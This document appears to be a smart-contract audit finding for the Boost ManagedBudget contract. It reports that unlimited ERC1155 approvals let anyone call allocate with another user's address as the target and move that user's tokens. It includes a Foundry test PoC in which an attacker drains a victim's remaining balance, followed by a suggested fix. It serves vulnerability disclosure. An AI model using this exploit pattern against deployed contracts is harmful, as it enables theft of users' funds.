# Attacker can transfer a user's ERC1155 funds into `ManagedBudget` due to unlimited approval for a token ID

### Summary

A user must approve the budget contract before they can allocate funds into the contract. For ERC1155, there is only a setApprovalForAll option. This means that if a user approves a specific token Id they must approve the contract for an unlimited amount. If a user did not want to allocate all of their tokens to the contract, they would still have to approve them all. Therefore anyone can call [allocate](https://github.com/sherlock-audit/2024-06-boost-aa-wallet/blob/78930f2ed6570f30e356b5529bd4bcbe5194eb8b/boost-protocol/packages/evm/contracts/budgets/ManagedBudget.sol#L57) with `request.target` as another user who has approved the contract and transfer their funds.

### Root Cause

ERC1155 requires unlimited approvals for a certain token id. A user must approve the `ManagedBudget` contract before allocating them to the contract. Because the contract is approved to transfer an unlimited amount on behalf of another user, anyone can call `allocate` and transfer another user's balance.

### Internal pre-conditions

1. A user approves `ManagedBudget` for an ERC1155 token
2. They allocate some, but not all of their tokens into the budget contract
3. User has a remaining balance for that token id

### External pre-conditions

_No response_

### Attack Path

1. Attacker calls `allocate` with `request.target` as another user with an available balance of `payload.tokenId` and a `payload.amount` <= the balance of the target

### Impact

User's can have their ERC1155 tokens involuntarily transferred into the `ManagedBudget` contract without them knowing. Potentially being lost through a disbursement.

Impact High- direct loss of user funds
Likelihood Low- No real incentive for user to do this

### PoC

Add following test function in `ManagedBudget.t.sol`

```Solidity
function testAllocate_ERC1155() public {
        address attacker = makeAddr("attacker");

        //mint an additional 100 to this address
        mockERC1155.mint(address(this), 42, 100);

        // Approve the budget to transfer tokens
        mockERC1155.setApprovalForAll(address(managedBudget), true);

        // Allocate 100 of token ID 42 to the budget
        bytes memory data = abi.encode(
            ABudget.Transfer({
                assetType: ABudget.AssetType.ERC1155,
                asset: address(mockERC1155),
                target: address(this),
                data: abi.encode(ABudget.ERC1155Payload({tokenId: 42, amount: 100, data: ""}))
            })
        );
        assertTrue(managedBudget.allocate(data));

        // Ensure the budget has 100 of token ID 42
        assertEq(managedBudget.available(address(mockERC1155), 42), 100);

        //We still have 100 tokens left
        assertEq(mockERC1155.balanceOf(address(this), 42), 100);

        //attacker transfers rest from user into managed budget contract
        vm.prank(attacker);
        assertTrue(managedBudget.allocate(data));
        assertEq(mockERC1155.balanceOf(address(this), 42), 0);
        vm.stopPrank();
    }
```

### Mitigation

Transfer tokens directly from caller rather than specifying a target address.
